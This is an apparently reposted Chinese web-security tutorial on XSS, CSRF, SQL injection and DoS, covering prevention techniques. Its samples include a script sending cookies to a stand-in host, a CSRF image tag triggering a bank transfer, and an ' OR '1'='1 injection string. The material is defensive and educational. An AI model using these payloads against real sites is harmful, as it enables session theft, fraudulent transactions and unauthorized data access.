# 跨站脚本攻击XSS

还可参考：https://blog.csdn.net/lpjishu/article/details/50917092

## 概念

跨站脚本攻击（Cross-Site Scripting, XSS），**可以将代码注入到用户浏览的网页上**，这种代码包括 HTML 和 JavaScript。

例如有一个论坛网站，攻击者可以在上面发布以下内容：

```html
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

之后该内容可能会被渲染成以下形式：

```html
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

另一个用户浏览了含有这个内容的页面将**会跳转到 domain.com 并携带了当前作用域的 Cookie。**如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。

## 危害

- 窃取用户的 Cookie 值
- 伪造虚假的输入表单骗取个人信息
- 显示伪造的文章或者图片

## 防范手段

（一）**设置 Cookie 为 HttpOnly**

设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，在一定程度上可以防止 XSS 窃取用户的 Cookie 信息。

（二）过滤特殊字符

许多语言都提供了对 HTML 的过滤：

- PHP 的 htmlentities() 或是 htmlspecialchars()。
- Python 的 cgi.escape()。
- Java 的 xssprotect (Open Source Library)。
- Node.js 的 node-validator。

例如 htmlspecialchars() 可以将 < 转义为 &lt;，将 > 转义为 &gt;，从而避免 HTML 和 Javascript 代码的运行。

（三）富文本编辑器的处理

富文本编辑器允许用户输入 HTML 代码，就不能简单地将 < 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。

富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，可以定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。

以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。

XSS 过滤在线测试

# 跨站请求伪造CSRF

**XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。**

## 概念

跨站请求伪造（Cross-site request forgery，CSRF），是**攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。**由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。

假如一家银行用以执行转账操作的 URL 地址如下：

http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。

那么，一个恶意攻击者可以在另一个网站上放置如下代码

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">
```

如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。

如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。

这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。

透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。

## 防范手段

（一）检查 Referer 字段

HTTP 头中有一个 Referer 字段，这个字段用于标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。

（二）添加校验 Token

由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。

正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。

（三）要求用户输入验证码来进行校验。

# SQL 注入攻击

## 概念

服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。

## 攻击原理

例如一个网站登录验证的 SQL 查询代码为：

```sql
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');
```


如果填入以下内容：

```sql
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
```

那么 SQL 查询字符串为：

```sql
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');
```


此时无需验证通过就能执行以下查询：

```sql
strSQL = "SELECT * FROM users;
```

## 防范手段

（一）使用参数化查询（不进行拼接）

以下以 Java 中的 PreparedStatement 为例，它是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。

```
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```


（二）单引号转换

（二）单引号转换

将传入的参数中的单引号转换为连续两个单引号

（三）检查变量数据类型和格式

# 拒绝服务攻击

拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。

作者：Rude3knife 
来源：CSDN 
原文：https://blog.csdn.net/qqxx6661/article/details/87374948 
版权声明：本文为博主原创文章，转载请附上博文链接！

